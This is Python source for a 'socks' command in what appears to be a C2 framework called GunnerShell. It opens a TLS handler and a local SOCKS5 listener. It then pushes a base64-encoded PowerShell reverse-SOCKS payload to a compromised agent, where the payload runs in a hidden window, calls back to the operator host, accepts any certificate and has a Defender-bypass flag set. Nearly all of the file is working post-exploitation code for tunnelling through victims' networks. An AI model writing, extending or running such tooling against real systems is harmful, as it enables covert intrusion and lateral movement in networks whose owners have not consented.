from core.gunnershell.commands.base import register, Command
import base64
import ntpath
import os
import sys
import subprocess
import re
import time
import ipaddress
import threading, socketserver, socket
import queue
import argparse
from itertools import chain, cycle
from core.listeners import tcp
import _thread
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred   = "\001" + Style.BRIGHT + Fore.RED + "\002"

@register("socks")
class SocksProxyCommand(Command):
	"""Start reverse SOCKS proxy: socks_proxy <socks_port> <handler_port>"""

	@property
	def help(self):
		return "socks_proxy <socks_port> <handler_port>    Reverse SOCKS"

	def execute(self, args):
		# 1) set up an argparse parser
		parser = argparse.ArgumentParser(prog="socks", add_help=False)
		parser.add_argument("-lh", dest="lh", type=str, required=True, help="Local host/IP for agent to connect back to")
		parser.add_argument("-sp", dest="sp", type=int, required=True, help="SOCKS port on your C2 (where proxychains will point)")
		parser.add_argument("-lp", dest="lp", type=int, required=True, help="Handler port on agent side to connect out from")

		try:
			opts = parser.parse_args(args)
		except SystemExit:
			# argparse has already printed its own usage to stdout;
			# re-print your colored help for consistency
			print(brightyellow + self.help)
			return

		# 2) delegate to your logic() method
		out = self.logic(
			sid=self.gs.sid,
			local_host=opts.lh,
			socks_port=opts.sp,
			handler_port=opts.lp,
			op_id=self.op_id
		)

		if out:
			print(brightgreen + out)

	def logic(self, sid, local_host, socks_port, handler_port=None, op_id="console"):
		ssl_lock = threading.Lock()
		reverse_sock = None

		def handlerServer(q, handler_port, context):
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.bind(("0.0.0.0", handler_port))
			sock.listen(5)
			#print(brightgreen + f"[+] Reverse handler listening on 0.0.0.0:{handler_port}")
			while True:
				client, addr = sock.accept()
				#print(brightgreen + f"[*] Revere Socks connection from agent {addr}")
				try:
					ssl_sock = context.wrap_socket(client, server_side=True, do_handshake_on_connect=False)

					with ssl_lock:
						ssl_sock.do_handshake()

				except Exception as e:
					print(brightred + f"[-] Handshake failed from {addr}: {e}")
					client.close()
					continue

				#print(brightgreen + f"[+] Reverse connection from {addr}")
				data = b""
				while data.count(b"\n") < 3:
					with ssl_lock:
						chunk = ssl_sock.recv(1024)

					if not chunk:
						break
					data += chunk

				"""if data:
					print(f"HANDLER SERVER RECEIVED: {data}")"""

				with ssl_lock:
					ssl_sock.send(b"HTTP/1.1 200 OK\nContent-Length: 999999\nContent-Type: text/plain\nConnection: Keep-Alive\nKeep-Alive: timeout=20, max=10000\n\n")


				with ssl_lock:
					ssl_sock.send(b"HELLO")

				while not q.empty():
					try:
						old = q.get_nowait()
						"""try:
							old.close()

						except Exception as e:
							#print(f"HIT EXCEPTION BLOCK WHEN CLOSING OLD VAR SOCKET: {e}")
							pass"""

					except Exception as e:
						#print(f"HIT EXCEPTION BLOCK WHEN GETTING Q OLD WITH NO WAIT: {e}")
						break

				q.put(ssl_sock)
				#print(f"[DEBUG] queued ssl_sock; queue size={q.qsize()}")

		def forward(src, dst, close_src=False, close_dst=False):
			global reverse_sock
			#print("IN FORWARD FUNCTION!")
			try:
				while True:
					data = src.recv(4096)
					if not data:
						#print("NO DATA")
						break

					"""if data:
						print(f"DATA HIT FORWARD FUNCTION: {data}")"""

					with ssl_lock:
						dst.sendall(data)

			except Exception as e:
				#print(f"HIT EXCEPTION IN FORWARD FUNCTION: {e}")
				pass

			finally:
				try:
					src.close()

				except Exception as e:
					#print(f"HIT EXCEPTION CLOSING SRC SOCKET: {e}")
					pass

				#print("SETTING REVERSE SOCK TO NONE")
				reverse_sock = None

				if close_dst:
					try:
						dst.close()

					except Exception as e:
						#print(f"HIT EXCEPTION CLOSING DST SOCKET: {e}")
						pass

		def handle_socks_client(client, agent_sock):
			# set TCP_NODELAY on both ends
			client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			agent_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

			# spawn the two directions
			t1 = threading.Thread(target=forward, args=(client, agent_sock))
			t2 = threading.Thread(target=forward, args=(agent_sock, client))
			t1.start()
			t2.start()
			# wait for both to finish before closing
			t1.join()
			t2.join()

			client.close()
			agent_sock.close()

		def server(proxy_port, handler_port):
			# generate TLS context using your existing function
			context = tcp.generate_tls_context("0.0.0.0")
			q = queue.Queue()

			# start reverse handler
			_thread.start_new_thread(handlerServer, (q, handler_port, context))

			# start local SOCKS5 proxy
			server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			server_sock.bind(("127.0.0.1", proxy_port))
			server_sock.listen(5)
			#print(brightgreen + f"[+] SOCKS5 proxy listening on 127.0.0.1:{proxy_port}")

			while True:
				client, addr = server_sock.accept()

				try:
					# get a *fresh* agent socket for _this_ client
					agent = q.get(timeout=10)
				except queue.Empty:
					#print("QUEUE EMPTY CLOSING CLIENT")
					client.close()
					continue

				# hand off to per‐connection handler
				threading.Thread(
					target=handle_socks_client,
					args=(client, agent),
					daemon=True
				).start()

			"""while True:
				client, addr = server_sock.accept()
				#print(brightgreen + f"[+] SOCKS client from {addr}")
				remote = getActiveConnection(q)
				if not remote:
					#print("NO ACTIVE CONNECTION, CLOSING CLIENT!!")
					client.close()
					continue

				try:
					client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
					remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

				except Exception as e:
					print(brightred + f"[!] Hit an error while modifying sockets")

				threading.Thread(target=forward, args=(client, remote), kwargs={"close_src":True, "close_dst":False}, daemon=True).start()
				threading.Thread(target=forward, args=(remote, client), kwargs={"close_src":False, "close_dst":True}, daemon=True).start()"""


		# --- GunnerShell command ---
		def socks_proxy(sid, local_host, socks_port, local_port, op_id="console"):
			"""
			Spins up reverse SOCKS:
			  1) TLS handler on handler_port (self-signed)
			  2) Local SOCKS5 server on proxy_port
			  3) Push full PowerShell logic to agent in one script
			"""
			# start Python server
			#print(f"HANLER PORT: {socks_port}")
			#print(f"PROXY PORT: {local_port}")
			#print(f"REMOTE PORT: {remote_port}")

			c2_host=socket.gethostbyname(socket.gethostname())
			_thread.start_new_thread(server, (socks_port, local_port))
			print(brightgreen + f"[+] Reverse SOCKS handler on 0.0.0.0:{local_port}, SOCKS5 on 127.0.0.1:{socks_port}")

			# full PowerShell payload in one triple-quoted string
			ps_script = f"""

[ScriptBlock]$SocksConnectionMgr = {{
	param($vars)
	$client = $vars.cliConnection
	$cliStream = $vars.cliStream

	try {{
		$buffer = New-Object byte[] 2
		$read = $cliStream.Read($buffer,0,2) | Out-Null

		$socksVer = $buffer[0]
		$nMethods = $buffer[1]
		$methods = New-Object byte[] $nMethods
		$read = $cliStream.Read($methods,0,$nMethods) | Out-Null

		$cliStream.Write([byte[]](5,0),0,2)

		$hdr = New-Object byte[] 4
		$read = $cliStream.Read($hdr,0,4) | Out-Null

		$cmd = $hdr[1]; $atyp = $hdr[3]

		switch ($atyp) {{
			1 {{
				$ipBytes = New-Object byte[] 4
				$read = $cliStream.Read($ipBytes, 0, 4)
				if ($read -ne 4) {{ throw "Failed to read full IPv4 address (read $read bytes)" }}
				$addr = ([System.Net.IPAddress]::New($ipBytes)).ToString()
			}}
			3 {{
				$lenBuf = New-Object byte[] 1
				$read = $cliStream.Read($lenBuf, 0, 1)
				if ($read -ne 1) {{ throw "Failed to read domain length byte" }}
				$len = $lenBuf[0]

				$domainBuf = New-Object byte[] $len
				$read = $cliStream.Read($domainBuf, 0, $len)
				if ($read -ne $len) {{ throw "Failed to read full domain name (expected $len, got $read)" }}
				$addr = [System.Text.Encoding]::ASCII.GetString($domainBuf)
			}}
			default {{
				throw "Unsupported address type: $atyp"
			}}
			}}

		$portBuf = New-Object byte[] 2
		$read = $cliStream.Read($portBuf, 0, 2)
		if ($read -ne 2) {{ throw "Failed to read full port bytes (read $read bytes)" }}
		$port = $portBuf[0] * 256 + $portBuf[1]

		$server = New-Object Net.Sockets.TcpClient($addr,$port)

		$srvStream = $server.GetStream()

		$copyToClient = {{
			param($srvStreamLocal, $cliStreamLocal)

			$runspace = [runspacefactory]::CreateRunspace()
			$runspace.Open()

			$ps = [powershell]::Create()
			$ps.Runspace = $runspace

			[void]$ps.AddScript({{
				param($srvStreamLocal, $cliStreamLocal)

				try {{
					while ($true) {{
						$b = New-Object byte[] 4096
						$r = $srvStreamLocal.Read($b, 0, $b.Length)
						if ($r -le 1) {{
							break
						}}

						$hex = [BitConverter]::ToString($b, 0, $r)
						$ascii = ([System.Text.Encoding]::ASCII.GetString($b, 0, $r))

						$cliStreamLocal.Write($b, 0, $r)
						$cliStreamLocal.Flush()
					}}
				}} catch {{
				}}

			}}).AddArgument($srvStreamLocal).AddArgument($cliStreamLocal)

			[void]$ps.BeginInvoke()
		}}

		$reply = [byte[]](5,0,0,1) + [byte[]]([System.Net.IPAddress]::Parse("0.0.0.0").GetAddressBytes()) + [byte[]](0,0)

		$cliStream.Write($reply,0,$reply.Length)
		Start-Sleep -Milliseconds 100

		$copyToClient.Invoke($srvStream, $cliStream)

		try {{
			while ($true) {{
				$b = New-Object byte[] 4096
				try {{
					$r = $cliStream.Read($b, 0, $b.Length)
				}} catch {{
					break
				}}
				if ($r -le 1) {{
					break
				}}

				$hexDump = [BitConverter]::ToString($b, 0, $r)
				$asciiPreview = ([System.Text.Encoding]::ASCII.GetString($b, 0, $r))

				try {{
					$srvStream.Write($b, 0, $r)
					$srvStream.Flush()
				}} catch {{
					break
				}}
			}}
		}} catch {{  }}

	}} catch {{

	}} finally {{
		$client.Dispose(); $server.Dispose()
	}}
}}

function Invoke-ReverseSocksProxy {{
	param(
		[String]$remoteHost = "{local_host}",
		[Int]$remotePort = {local_port},
		[Int]$socksPort = {socks_port}
	)

	while ($true) {{
		$client = New-Object Net.Sockets.TcpClient($remoteHost,$remotePort)
		$ns = $client.GetStream()
		$callback = [System.Net.Security.RemoteCertificateValidationCallback]{{
			Param($sender, $certificate, $chain, $sslPolicyErrors)
			Write-Host "[*] PS: In certificate validation callback"
			Write-Host "[*] PS: sslPolicyErrors = $sslPolicyErrors"
			return $true
		}}

		$ssl = New-Object System.Net.Security.SslStream($ns,$false, $callback)
		$ssl.AuthenticateAsClient($remoteHost)

		$req = [Text.Encoding]::ASCII.GetBytes("CONNECT / HTTP/1.1`nHost: $remoteHost`n`n")
		$ssl.Write($req,0,$req.Length)
		$buffer = New-Object byte[] 32; $ssl.Read($buffer,0,32) | Out-Null

		while ($true) {{
			$helloBuf = New-Object byte[] 5
			$count    = $ssl.Read($helloBuf, 0, 5)
			$hello    = [System.Text.Encoding]::ASCII.GetString($helloBuf, 0, $count)
			if ($hello -eq 'HELLO') {{
				break
			}}
			Start-Sleep -Milliseconds 100
		}}
		# local listener
		$vars = @{{ cliConnection = $ssl; cliStream = $ssl }}
		Start-Sleep -Milliseconds 200
		$PS = [PowerShell]::Create().AddScript($SocksConnectionMgr).AddArgument((New-Object PSObject -Property $vars))
		$PS.BeginInvoke()
	}}

}}

Invoke-ReverseSocksProxy

Write-Host "SOCKS proxy running in background runspace."
"""

			# encode and execute
			b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
			ps_cmd = (
				f"$ps = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"{b64}\")); "
				"Invoke-Expression $ps'"
			)

			ps_cmd = base64.b64encode(ps_cmd.encode('utf-16le')).decode()


			ps_cmd = (
				f"Start-Process powershell.exe -ArgumentList \"-NoProfile\",\"-EncodedCommand\",{b64} "
				"-WindowStyle Hidden"
				)

			session = session_manager.sessions[sid]
			transport = session.transport.lower()

			if transport in ('tcp', 'tls'):
				tcp_exec.run_command_tcp(sid, ps_cmd, timeout=5, defender_bypass=True, op_id=op_id)

			elif transport in ('http', 'https'):
				http_exec.run_command_http(sid, ps_cmd, defender_bypass=True, output=False, op_id=op_id)

			else:
				print(brightred + "Unsupported transport for socks_proxy")

			#print(brightgreen + f"[+] Agent listening on 0.0.0.0:{remote_port} via proxy {local_port}")

		socks_proxy(sid, local_host, socks_port, handler_port, op_id=op_id)